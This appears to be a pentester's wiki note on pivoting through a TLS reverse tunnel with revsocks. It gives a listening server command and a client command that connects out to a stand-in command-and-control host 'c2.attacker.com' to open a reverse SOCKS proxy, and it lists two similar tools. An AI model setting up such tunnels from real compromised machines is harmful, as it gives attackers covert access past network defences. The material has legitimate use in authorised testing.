---
title: TLS Tunnel
---

[[notes/tunneling/index]] over the [[notes/network/tls]] protocol.

Start a [[notes/tools/revsocks]] server on Linux.

~~~ bash
sudo ./revsocks -listen :443 -socks 127.0.0.1:1080 -pass 'passw0rd'
~~~

Connect with the client from Linux or Windows to establish a reverse [[notes/pivoting/socks-proxy]].

~~~ bash
./revsocks -recn 0 -rect 60 -connect c2.attacker.com:443 -pass 'passw0rd'
~~~

Untested tools:

- [ligolo-ng](https://github.com/nicocha30/ligolo-ng), reverse tunnel with TUN device on server while client doesn't need admin privileges, supports Windows
- [ReverseSocks5](https://github.com/Acebond/ReverseSocks5), reverse SOCKS5 proxy over TLS in Go
